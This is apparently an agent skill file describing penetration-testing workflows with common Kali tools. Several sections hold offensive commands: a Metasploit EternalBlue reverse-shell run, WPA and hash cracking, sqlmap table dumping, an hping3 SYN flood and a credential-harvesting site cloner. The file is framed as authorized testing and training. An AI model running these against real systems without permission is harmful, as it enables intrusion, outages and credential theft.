---
name: ethical-hacking
description: Defensive and authorized penetration testing guidance: recon, mapping, traffic analysis, credential auditing, web app scanning, and basic forensics. Use when the user asks for pentesting workflows, vulnerability assessment, recon/scanning, security audits, or learning common tools in an authorized lab. Refuse illegal/unauthorized hacking and avoid instructions that enable wrongdoing.
license: CC-BY-4.0
---

# Agent Skillset: Ethical Hacking & Penetration Testing

## Overview

This agent possesses knowledge of standard industry tools found in distributions like Kali Linux. The agent utilizes these skills to identify vulnerabilities, audit system security, and simulate attacks to improve defense mechanisms.

> WARNING: These commands are for educational and authorized testing purposes only. Executing these against networks or systems without explicit permission is illegal.

---

## Core Competencies

### 1. Network Reconnaissance & Mapping

- Primary Tool: `nmap`
- Description: Discovery of hosts and services on a computer network.
- Standard Operations:
  - Basic Scan: Scan a target IP or domain for open ports.
    ```bash
    nmap <target_ip_or_url>
    ```
  - Aggressive Scan: Enables OS detection, version detection, script scanning, and traceroute.
    ```bash
    nmap -A <target_ip_or_url>
    ```

### 2. Network Traffic Analysis

- Primary Tool: `wireshark`
- Description: Graphical tool for deep inspection of network protocols and data packets.
- Standard Operations:
  - Launch GUI:
    ```bash
    wireshark
    ```
  - Workflow:
    1. Select network interface (e.g., `eth0`, `wlan0`).
    2. Click the blue "Shark fin" icon to start capturing.
    3. Apply display filters (e.g., `http`, `ip.addr == <target_ip>`) to isolate specific traffic.
    4. Right-click a packet -> "Follow TCP Stream" to see the full data payload.

### 3. Exploitation & Payload Delivery

- Primary Tool: `metasploit-framework`
- Description: Framework for developing and executing exploit code.
- Standard Operations:
  - Launch Console:
    ```bash
    msfconsole
    ```
  - Exploit Workflow (Example: EternalBlue):
    ```bash
    search EternalBlue              # Find relevant exploits
    use exploit/windows/smb/...     # Select the exploit module
    set PAYLOAD <payload_type>      # e.g., windows/x64/meterpreter/reverse_tcp
    set LHOST <your_ip>             # Set your listening IP
    set RHOSTS <target_ip>          # Set the target IP
    exploit                         # Launch the attack
    ```

### 4. Wireless Network Assessment

- Primary Tool: `aircrack-ng` suite
- Description: Assess WiFi network security and crack WEP/WPA keys.
- Standard Operations:
  - Monitor Mode: Put the wireless card into monitor mode.
    ```bash
    airmon-ng start wlan0
    ```
  - Capture Packets: Sniff traffic to capture the WPA handshake.
    ```bash
    airodump-ng <interface_name>
    ```
  - Crack Key: Attempt to crack the captured handshake using a wordlist.
    ```bash
    aircrack-ng -w <wordlist_file> <capture_file.cap>
    ```

### 5. Credential Security & Password Auditing

- Primary Tool: `hashcat`
- Description: Advanced password recovery using CPU/GPU power.
- Standard Operations:
  - Basic Dictionary Attack:
    ```bash
    # -m 0 = MD5 hashing mode
    # -a 0 = Dictionary attack mode
    hashcat -m 0 -a 0 <hash_file> /usr/share/wordlists/rockyou.txt
    ```

### 6. Web Application Vulnerability Scanning

- Primary Tool: `skipfish`
- Description: Active web application security reconnaissance.
- Standard Operations:
  - Crawl & Scan:
    ```bash
    # -o creates an output directory for the report
    skipfish -o <output_directory> <target_url>
    ```

### 7. Forensic Data Recovery

- Primary Tool: `foremost`
- Description: Recover lost files based on headers and internal structures.
- Standard Operations:
  - Recover All Types:
    ```bash
    foremost -i <image_file_or_drive>
    ```
  - Recover Specific Types: Recover only specific file types (e.g., jpg, pdf).
    ```bash
    foremost -t jpg,pdf -i <image_file>
    ```

### 8. Database Penetration Testing

- Primary Tool: `sqlmap`
- Description: Automates detection and exploitation of SQL injection flaws.
- Standard Operations:
  - Basic Scan:
    ```bash
    sqlmap -u <target_url_with_parameters>
    ```
  - Enumerate Databases: List all databases on the server.
    ```bash
    sqlmap -u <target_url> --dbs
    ```
  - Dump Data: Extract data from a specific table.
    ```bash
    sqlmap -u <target_url> -D <database_name> -T <table_name> --dump
    ```

### 9. Network Stress Testing (DoS)

- Primary Tool: `hping3`
- Description: Packet assembler/analyzer for stress testing (DoS).
- Standard Operations:
  - SYN Flood Attack: Send SYN packets as fast as possible to flood the target.
    ```bash
    # -S = SYN flag
    # --flood = send packets as fast as possible
    hping3 -S --flood -V <target_ip>
    ```

### 10. Social Engineering Simulation

- Primary Tool: Social-Engineer Toolkit (`setoolkit`)
- Description: Framework for social engineering attacks (phishing, etc.).
- Standard Operations:
  - Launch Toolkit:
    ```bash
    setoolkit
    ```
  - Workflow:
    1. Select `1` for Social-Engineering Attacks.
    2. Select `2` for Website Attack Vectors.
    3. Select `3` for Credential Harvester Attack Method.
    4. Select `2` for Site Cloner.
    5. Enter the URL to clone and your local IP to receive the credentials.
